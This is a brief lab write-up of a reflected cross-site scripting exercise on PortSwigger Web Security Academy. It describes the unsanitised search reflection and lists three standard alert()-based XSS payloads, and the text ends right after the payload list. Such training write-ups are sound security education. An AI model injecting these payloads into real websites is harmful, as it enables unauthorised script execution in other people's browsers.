# Cross-Site Scripting (XSS) – Reflected Search Exploit

> Successfully exploited a reflected Cross-Site Scripting (XSS) vulnerability to execute arbitrary JavaScript in the victim’s browser.

<img width="1643" height="647" alt="Screenshot 2026-03-24 143436" src="https://github.com/user-attachments/assets/b2ff6f90-a6b6-4c0e-9e98-be98ec9f4249" />


---

## 🧠 Objective
Identify and exploit a reflected XSS vulnerability in the search functionality.

---

## 🛠️ Environment
- Platform: PortSwigger Web Security Academy  
- Vulnerability Type: Reflected XSS  

---

## 🔍 Vulnerability Description
The application reflects user input directly into the HTML response without proper sanitization or encoding. This allows attackers to inject and execute malicious JavaScript in the victim’s browser.

---

## 💥 Payloads Used

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
